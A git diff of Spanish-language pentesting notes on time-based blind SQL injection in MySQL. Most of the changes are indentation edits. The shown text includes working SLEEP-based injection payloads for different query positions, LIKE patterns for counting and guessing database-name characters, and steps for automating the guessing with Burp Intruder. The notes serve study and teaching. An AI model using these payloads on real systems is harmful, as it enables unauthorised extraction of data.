@@ -529,8 +529,9 @@ waitfor delay '00:00:10' Sleep
 - Boleean based:
 - Time based:
   - Es en base a una función boleana, donde sí el tiempo de espera a la respuesta es mayor a la normal, significa que evalua la función como true y manda a hacer un sleep, o función que ralentiza su ejecución.
-  - MYSQL:
-  1 - Posición: Dependiendo de en que posición de la ejecución, pero los payloads más sencillos para mysql <5> es:
+    - MYSQL:
+
+1 - Posición: Dependiendo de en que posición de la ejecución, pero los payloads más sencillos para mysql <5> es:
 ```
       - CAMPOS:   Select $<SLEEP(5)> FROM users;
       - WHERE:    SELECT * FROM users WHERE username = '$<' OR SLEEP(5)--> -';
@@ -541,16 +542,16 @@ waitfor delay '00:00:10' Sleep
       - UPDATE:   UPDATE users SET email = '$payload' WHERE id = 1; $payload= test@example.com', SLEEP(5), email='test2@example.com
       - INSERT:   INSERT INTO logs (message) VALUES ('$payload'); $payload= x'), (SLEEP(5)), ('y
 ```
-  2 - Validar: A partir de aquí primero debemos ejecutar una función donde validaremos que podemos hacer validaciones boleanas, con una función que en teoria casi siempre deberia funcionar, por ejemplo esta función va a hacer sleep sí encuentra que database contiene algun caracter:
+2 - Validar: A partir de aquí primero debemos ejecutar una función donde validaremos que podemos hacer validaciones boleanas, con una función que en teoria casi siempre deberia funcionar, por ejemplo esta función va a hacer sleep sí encuentra que database contiene algun caracter:
 ```
       - AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '%')#
 ```
-  3 - Contar caracteres: Podemos usar like '__' para ir incrementandolo hasta encontrar la cantidad de caracteres correcta:
+3 - Contar caracteres: Podemos usar like '__' para ir incrementandolo hasta encontrar la cantidad de caracteres correcta:
 ```
       - AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '__')# Sí falso = no esperar tiempo
       - AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '___')# Sí verdadero = espera 1 segundo
 ```
-  4 - Adivinar caracteres: Usando "Intruder" y "Sniper Attack", incrustamos el mismo payload con caracteres o numeros, y en "Resouce Pool" solo ponemos un "request" como maximo y solo buscamos los que tarden más en responder
+4 - Adivinar caracteres: Usando "Intruder" y "Sniper Attack", incrustamos el mismo payload con caracteres o numeros, y en "Resouce Pool" solo ponemos un "request" como maximo y solo buscamos los que tarden más en responder
 
 ```
       - AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '$_$$_$$_$')#
